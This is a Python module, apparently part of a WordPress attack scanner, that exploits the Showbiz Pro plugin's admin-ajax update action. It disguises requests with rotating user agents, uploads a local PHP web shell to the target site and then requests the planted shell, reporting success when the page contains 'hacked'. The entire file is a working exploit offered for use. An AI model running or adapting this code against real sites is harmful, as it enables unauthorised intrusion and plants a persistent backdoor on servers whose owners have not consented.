import requests
import datetime
import time
import re
import random


now = datetime.datetime.now()
year = now.strftime('%Y')
month= now.strftime('%m')


# Showbiz Pro
def wp_showbiz(url,headers,vulnresults):
    endpoint = url + "/wp-admin/admin-ajax.php"
    #method to randomize the user agent [functionINfunction]
    def random_UserAgent():
        useragents_rotate = [
            "Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0",
            "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
            "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31"
        ]
        useragents_random = random.choice(useragents_rotate)
        return useragents_random
    useragent=random_UserAgent()
    headers['User-Agent'] = useragent
    headers['Content_Type'] = 'multipart/form-data'
    payload = {
                "action":"showbiz_ajax_action",
                "client_action":"update_plugin",
                "update_file":[open('shell/VulnX.php','rb')]
            }
    send_shell = requests.post(endpoint,files=payload,data=payload,headers=headers)
    dump_data = url + "/wp-content/plugins/showbiz/temp/update_extract/VulnX.php?Vuln=X"
    res=requests.get(dump_data, headers).text
    if "Orusula" and "hacked" in res:
        print ('[+] Showbiz Pro ' + dump_data + ' ')
    else:
        print ('[-] Showbiz Pro')